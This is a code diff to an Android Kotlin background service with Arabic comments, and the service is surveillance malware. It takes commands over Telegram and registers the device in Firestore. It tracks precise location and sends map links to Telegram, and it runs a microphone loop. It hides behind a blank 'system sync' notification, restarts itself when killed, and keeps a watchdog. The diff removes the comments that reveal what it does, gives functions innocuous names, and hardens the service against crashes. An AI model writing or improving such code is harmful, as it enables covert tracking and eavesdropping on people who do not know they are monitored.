@@ -26,22 +26,20 @@ class BackgroundService : Service() {
     override fun onCreate() {
         super.onCreate()
 
-        // Foreground notification — إشعار صغير أبيض بدون نص
-        startForegroundWithNotification()
+        try { startForegroundCompat() } catch (e: Exception) {
+            android.util.Log.e("BgService", "fg err: ${e.message}")
+        }
 
-        // استقبال الأوامر من تلغرام
         try { CommandListener.start(applicationContext) } catch (_: Exception) {}
+        try { DeviceManager.registerDeviceOnce(applicationContext) } catch (_: Exception) {}
 
-        // تسجيل الجهاز في Firestore
-        try { DeviceManager.registerDevice(applicationContext) } catch (_: Exception) {}
-
-        // ⭐ SyncWorker — يبدأ بعد 3 ثواني (بعد ما registerDevice يخلّص)
+        // Sync
         scope.launch {
             delay(3_000L)
             try { SyncWorker.start(applicationContext) } catch (_: Exception) {}
         }
 
-        // Heartbeat كل 3 دقايق
+        // Heartbeat
         scope.launch {
             while (running) {
                 try { DeviceManager.updateHeartbeat(applicationContext) } catch (_: Exception) {}
@@ -49,16 +47,17 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ الموقع شغال دائم في الخلفية (كل 5 دقايق)
+        // Location
         scope.launch {
             while (running) {
                 try {
-                    val loc = LocationHelper.getPreciseLocation(applicationContext, 15)
-                    if (loc != null) {
-                        LocationCache.save(applicationContext, loc.latitude, loc.longitude, loc.accuracy)
-                        // لو التتبع التلقائي مفعّل — يبعت للتلغرام
-                        if (KeyboardBuilder.locationOn) {
-                            TelegramApi.sendMessage("📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
+                    if (hasLocationPermission()) {
+                        val loc = LocationHelper.getPreciseLocation(applicationContext, 15)
+                        if (loc != null) {
+                            LocationCache.save(applicationContext, loc.latitude, loc.longitude, loc.accuracy)
+                            if (KeyboardBuilder.locationOn) {
+                                TelegramApi.sendMessage("📍 *الموقع*\nhttps://www.google.com/maps?q=${loc.latitude},${loc.longitude}")
+                            }
                         }
                     }
                 } catch (_: Exception) {}
@@ -66,7 +65,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // تنظيف ملفات الكاش القديمة
+        // Cleanup
         scope.launch {
             while (running) {
                 try {
@@ -80,7 +79,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ المايك (لو مفعّل يدوياً)
+        // Mic
         scope.launch {
             while (running) {
                 try {
@@ -99,29 +98,32 @@ class BackgroundService : Service() {
             }
         }
 
-        // ⭐ Watchdog — يتحقق كل دقيقة إن كل حاجة شغالة
+        // Watchdog
         scope.launch {
             while (running) {
                 delay(60_000L)
                 try {
-                    // لو الـ SyncWorker وقف، شغّله تاني
-                    if (!SyncWorkerIsRunning()) {
-                        SyncWorker.start(applicationContext)
-                    }
+                    if (!SyncWorkerIsRunning()) SyncWorker.start(applicationContext)
                 } catch (_: Exception) {}
             }
         }
     }
 
+    private fun hasLocationPermission(): Boolean {
+        return try {
+            val fine = ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            val coarse = ContextCompat.checkSelfPermission(applicationContext, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
+            fine || coarse
+        } catch (_: Exception) { false }
+    }
+
     private fun SyncWorkerIsRunning(): Boolean {
         return try {
-            // فحص بسيط: هل فيه thread اسمه sync-main؟
             Thread.getAllStackTraces().keys.any { it.name == "sync-main" && it.isAlive }
         } catch (_: Exception) { true }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
-
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onDestroy() {
@@ -130,8 +132,6 @@ class BackgroundService : Service() {
         try { SyncWorker.stop() } catch (_: Exception) {}
         try { DeviceManager.markInactive(applicationContext) } catch (_: Exception) {}
         scope.cancel()
-
-        // إعادة تشغيل الخدمة تلقائياً
         try {
             val restart = Intent(applicationContext, BackgroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -140,14 +140,10 @@ class BackgroundService : Service() {
                 applicationContext.startService(restart)
             }
         } catch (_: Exception) {}
-
         super.onDestroy()
     }
 
-    // ═══════════════════════════════════════════
-    //  Foreground notification — أبيض صغير بدون نص
-    // ═══════════════════════════════════════════
-    private fun startForegroundWithNotification() {
+    private fun startForegroundCompat() {
         val channelId = "sys_sync_channel"
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -176,7 +172,11 @@ class BackgroundService : Service() {
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
+            try {
+                startForeground(1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } catch (_: Exception) {
+                startForeground(1001, notif)
+            }
         } else {
             startForeground(1001, notif)
         }
